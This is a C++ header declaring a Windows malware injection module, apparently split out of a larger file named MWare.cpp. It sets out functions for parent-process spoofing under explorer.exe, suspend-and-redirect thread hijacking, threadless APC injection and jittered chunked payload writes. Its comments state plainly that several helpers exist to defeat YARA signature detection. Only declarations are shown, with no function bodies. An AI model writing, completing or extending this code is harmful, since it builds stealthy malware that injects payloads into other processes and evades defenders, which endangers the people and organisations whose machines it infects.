// ============================================================================
// thread_hijack.h — Thread Hijacking Injection Module
// ============================================================================
// Extracted from MWare.cpp lines 3186-3745.
// Provides:
//   1. Helper: getExplorerPID() — find explorer.exe PID for parent spoofing
//   2. Helper: createProcessWithParentSpoofing() — spawn under explorer.exe
//   3. YARA evasion helpers: hijackOpaqueCheck(), hijackLegitimatePause(),
//      hijackWriteMemory(), hijackExecuteThread()
//   4. Main: performThreadHijacking() — suspend-thread, redirect-execution
//   5. Main: performThreadlessInject() — threadless APC injection
// ============================================================================
#pragma once

#include <string>
#include <vector>
#include <random>
#include <cstring>
#include <cwchar>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#endif

#include "obfuscation.h"
#include "api_table.h"

// ============================================================================
// FUNCTION DECLARATIONS
// ============================================================================

#ifdef _WIN32

// Helper: Get explorer.exe PID for parent spoofing
DWORD getExplorerPID();

// Helper: Create process with explorer.exe as parent (parent PID spoofing)
bool createProcessWithParentSpoofing(const std::string& process_path, PROCESS_INFORMATION& pi);

// Opaque predicate: always non-zero, breaks YARA decompiler pattern matching
DWORD hijackOpaqueCheck();

// Legitimate pause: reads registry between injection phases (breaks linear API sequence)
void hijackLegitimatePause();

// Chunked payload write: writes in 4KB chunks with jitter
bool hijackWriteMemory(HANDLE hProcess, PVOID remote_mem,
                       const std::string& payload, SIZE_T& bytes_written);

// Thread control: suspend → modify context → resume (broken into separate function)
bool hijackExecuteThread(HANDLE hThread, PVOID remote_mem);

#endif // _WIN32

// Main thread hijacking function (cross-platform decl)
std::string performThreadHijacking(const std::string& process_name, const std::string& payload_data);

// Threadless injection (cross-platform decl)
std::string performThreadlessInject(const std::string& process_name, const std::string& payload_hex);
